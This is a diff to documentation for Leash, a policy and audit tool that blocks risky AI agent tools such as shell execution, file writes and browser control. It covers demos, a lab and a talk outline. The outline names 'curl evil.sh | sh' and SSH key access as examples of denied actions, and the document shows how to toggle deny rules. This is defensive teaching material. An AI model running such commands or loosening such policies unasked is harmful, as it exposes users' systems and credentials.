@@ -32,16 +32,17 @@ leash demo
 
 That's it. You'll see:
 
-1. **Identity**: an `openclaw-agent` registers and gets a signed token.
-2. **Three allows**: read a file, search the web, check session status.
-3. **Three denies**, each with the policy's reason:
+1. **Policy**: the six `tool: allow|deny` lines from `app/policies/openclaw.yaml` that decide this demo.
+2. **Identity**: an `openclaw-agent` registers and gets a signed token.
+3. **Three allows**: read a file, search the web, check session status.
+4. **Three denies**, each with the policy's reason:
    ```
-   ✘ DENY   Shell execution is blocked — this is the highest-risk tool
-   ✘ DENY   File writes are blocked by default
-   ✘ DENY   Browser control is blocked — high risk, enables arbitrary web actions
+   ✘ DENY   exec is blocked — it could run any shell command on your computer
+   ✘ DENY   write is blocked — it could create or overwrite any file it can reach
+   ✘ DENY   browser is blocked — it could drive a real web browser: click, type, and use sites you are logged in to
    ```
-4. **Audit log**: all six decisions, each storing the hash of the entry before it. Verification says `✔ VALID`.
-5. **Tampering**: the demo flips the shell denial to "allow" directly in the database. Verification now says `✘ BROKEN … at entry #5`.
+5. **Audit log**: all six decisions, each storing the hash of the entry before it. Verification says `✔ VALID`.
+6. **Tampering**: the demo flips the shell decision directly in the database. Verification now says `✘ BROKEN … at entry #5`.
 
 Everything runs on a throwaway server in a temp folder and is deleted afterwards.
 
@@ -50,6 +51,17 @@ Everything runs on a throwaway server in a temp folder and is deleted afterwards
 | Pause between each part (presenting) | `leash demo --step` |
 | Keep the server running and click around the dashboard | `leash demo --keep` |
 | See the rules that made these decisions | open `app/policies/openclaw.yaml` |
+| Learn what every OpenClaw tool can do, and whether it's allowed | `leash scan openclaw` |
+
+### Flip a switch
+
+Open `app/policies/openclaw.yaml`. Each line is one tool:
+
+```yaml
+  exec: deny        # 🔴 can run any shell command on your computer
+```
+
+Change `deny` to `allow`, save, and run `leash demo` again. Step 4 is now `✔ ALLOW`, and `leash scan openclaw` marks `exec` as **⚠ high risk and allowed**. Change it back to `deny` when you're done. A typo such as `exce: allow` is caught by `leash policy validate app/policies/`, which suggests *did you mean 'exec'?*
 
 ---
 
@@ -95,11 +107,11 @@ python3 integrations/openclaw/lab.py deny
              tool ran → "Hello, Cyber Lab Night!"
 
   ✘ BLOCKED  write pwned.txt
-             Leash: File writes are blocked by default
+             Leash: write is blocked — it could create or overwrite any file it can reach
   ✘ BLOCKED  edit hello.txt
-             Leash: File edits are blocked by default
+             Leash: edit is blocked — it could change the contents of existing files
   ✘ BLOCKED  browser https://example.com
-             Leash: Browser control is blocked — high risk, enables arbitrary web actions
+             Leash: browser is blocked — it could drive a real web browser: click, type, and use sites you are logged in to
 
   pwned.txt exists? no — the write never ran
 ```
@@ -127,9 +139,9 @@ leash audit verify     # ✔ Audit chain VALID
 
 ### Try it yourself
 
-- **Allow writes**: in `app/policies/openclaw.yaml`, change the `write` rule to `effect: allow` and save (Leash reloads it automatically). Re-run `lab.py deny`: the write now succeeds.
-- **Scope it**: add `resource: "notes/*"` to that rule so only one folder is writable.
-- **Watch before you block**: set `mode: observe` on a policy, then check `leash audit log --decision observe_deny`.
+- **Allow writes**: in `app/policies/openclaw.yaml`, change `write: deny` to `write: allow` and save (Leash reloads it automatically). Re-run `lab.py deny`: the write now succeeds. Change it back afterwards.
+- **Check your work**: `leash scan openclaw` shows every tool's current decision and flags risky allows.
+- **Go further**: scoping to a folder (`resource: "notes/*"`) or watching before blocking (`mode: observe`) uses the full rule format. See [Write Your First Policy](write-your-first-policy.md).
 
 ---
 
@@ -141,7 +153,7 @@ Use **Part A** on stage. It has no network, API keys, or Node dependency. Run Pa
 |---|---|---|
 | 0:00 | Hook: "Your AI agent has a shell. Who said yes?" | Title slide |
 | 0:45 | Agent → plugin → Leash → audit | Diagram at the top of this page |
-| 1:30 | Policy is plain YAML | `app/policies/openclaw.yaml` |
+| 1:30 | Policy is one `allow`/`deny` line per tool | `app/policies/openclaw.yaml` (or `leash scan openclaw`) |
 | 2:30 | Run `leash demo --step`: identity, then 3 allows | Press Enter between parts |
 | 3:30 | 3 denies: `curl evil.sh \| sh`, SSH keys, bank website | Each reason on screen |
 | 4:30 | Audit log + `✔ VALID` | Hash links in the `prev_hash` column |
